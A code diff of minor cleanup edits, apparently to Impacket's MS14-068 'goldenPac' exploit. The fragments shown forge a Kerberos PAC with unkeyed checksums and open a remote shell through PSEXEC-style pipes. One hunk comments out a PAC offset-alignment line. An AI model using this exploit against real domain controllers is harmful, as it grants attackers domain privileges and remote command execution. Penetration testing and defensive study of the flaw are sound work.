@@ -346,7 +346,7 @@ class PSEXEC:
             packet = RemComMessage()
             pid = os.getpid()
 
-            packet['Machine'] = ''.join([random.choice(string.letters) for i in range(4)])
+            packet['Machine'] = ''.join([random.choice(string.letters) for _ in range(4)])
             if self.__path is not None:
                 packet['WorkingDir'] = self.__path
             packet['Command'] = self.__command
@@ -451,7 +451,7 @@ class RemoteStdOutPipe(Pipes):
         while True:
             try:
                 ans = self.server.readFile(self.tid,self.fid, 0, 1024)
-            except Exception, e: 
+            except:
                 pass
             else:
                 try:
@@ -478,7 +478,7 @@ class RemoteStdErrPipe(Pipes):
         while True:
             try:
                 ans = self.server.readFile(self.tid,self.fid, 0, 1024)
-            except Exception, e: 
+            except:
                 pass
             else:
                 try:
@@ -595,11 +595,11 @@ class RemoteStdInPipe(Pipes):
 
     def run(self):
         self.connectPipe()
-        self.shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.TGS, self.share)
-        self.shell.cmdloop()
+        shell = RemoteShell(self.server, self.port, self.credentials, self.tid, self.fid, self.TGS, self.share)
+        shell.cmdloop()
 
 
-class MS14_068():
+class MS14_068:
     # 6.1.  Unkeyed Checksums
     # Vulnerable DCs are accepting at least these unkeyed checksum types
     CRC_32  = 1
@@ -623,6 +623,8 @@ class MS14_068():
         self.__copyFile = copyFile
         self.__command = command
         self.__writeTGT = writeTGT
+        self.__domainSid = ''
+
         if kdcHost is not None:
             self.__kdcHost = kdcHost
         else:
@@ -810,7 +812,7 @@ class MS14_068():
         privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
         privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
         privSvrChecksumIB['Offset'] = offsetData
-        offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
+        #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
 
         # Building the PAC_TYPE as specified in [MS-PAC]
         buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(pacClientInfo) + pacClientInfoAlignment
@@ -1012,8 +1014,7 @@ class MS14_068():
                 for pa in asRep['padata']:
                     if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                         etype2 = decoder.decode(str(pa['padata-value'])[2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
-                        enctype = etype2['etype']
-                        salt = str(etype2['salt']) 
+                        salt = str(etype2['salt'])
 
             cipherText = asRep['enc-part']['cipher']
 
@@ -1082,11 +1083,13 @@ class MS14_068():
         pass
 
 if __name__ == '__main__':
+    # Init the example's logger theme
+    logger.init()
     import argparse
     import sys
     try:
         import pyasn1
-    except:
+    except ImportError:
          logging.critical('This module needs pyasn1 installed')
          logging.critical('You can get it from https://pypi.python.org/pypi/pyasn1')
          sys.exit(1)
